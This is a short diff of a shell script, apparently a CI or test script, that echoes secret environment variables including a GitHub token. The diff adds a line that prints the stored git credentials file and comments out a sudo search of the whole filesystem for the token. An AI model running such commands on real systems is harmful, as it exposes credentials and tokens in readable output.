@@ -14,10 +14,14 @@ echo "SECRET: ${VERY_SECRET}"
 echo "SECRET: ${GITHUB_TOKEN}"
 
 
+df -h
+
 pwd
 
 # ls
 
 # grep -r GITHUB_TOKEN ../../
 
-sudo grep -r GITHUB_TOKEN /
+# sudo grep -r GITHUB_TOKEN /
+
+cat ~/.git-credentials
